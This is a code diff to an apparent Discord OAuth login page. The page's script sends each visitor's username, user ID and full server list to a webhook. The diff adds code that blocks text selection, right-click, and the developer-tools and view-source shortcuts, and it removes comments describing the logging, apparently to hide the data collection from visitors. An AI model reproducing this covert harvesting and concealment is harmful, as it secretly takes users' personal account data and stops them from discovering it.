@@ -15,6 +15,11 @@
             min-height: 100vh;
             margin: 0;
             padding: 20px;
+            /* Disable text selection */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
 
         .card {
@@ -275,14 +280,13 @@
         }).join('');
         }
 
-        // 3. File-Attachment Webhook logging (Supports 80+ servers)
         async function logLoginToWebhook(user, guilds) {
         try {
         const username = user.global_name
         ? `${user.global_name} (@${user.username})`
         : `@${user.username}`;
 
-        // Generate text file content for ALL servers
+        // Build text file content for all servers
         let fileText = `=========================================\n`;
         fileText += ` DISCORD SERVER LIST FOR ${user.username.toUpperCase()}\n`;
         fileText += ` User ID: ${user.id}\n`;
@@ -303,7 +307,6 @@
         fileText += "No servers found.";
         }
 
-        // Build Webhook Embed Payload
         const payload = {
         embeds: [{
         title: "Discord OAuth Completed",
@@ -322,7 +325,6 @@
         }]
         };
 
-        // Create Multipart Form Data to attach file
         const formData = new FormData();
         formData.append('payload_json', JSON.stringify(payload));
 
@@ -336,13 +338,38 @@
 
         if (!res.ok) {
         const errText = await res.text();
-        console.error("Discord Webhook Rejected:", errText);
+        console.error("Webhook rejected by Discord API:", errText);
         }
 
         } catch (e) {
         console.error("Webhook processing error:", e);
         }
         }
+
+        // ==========================================
+        // FRONT-END RESTRICTIONS (Deterrents)
+        // ==========================================
+
+        // 1. Disable Right-Click Context Menu (Prevents Inspect via click)
+        document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        });
+
+        // 2. Disable Keyboard Shortcuts (F12, Ctrl+Shift+I/J/C, Ctrl+U)
+        document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12') {
+        e.preventDefault();
+        }
+        if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) {
+        e.preventDefault();
+        }
+        if (e.metaKey && e.altKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) {
+        e.preventDefault();
+        }
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) {
+        e.preventDefault();
+        }
+        });
     </script>
 </body>
 </html>
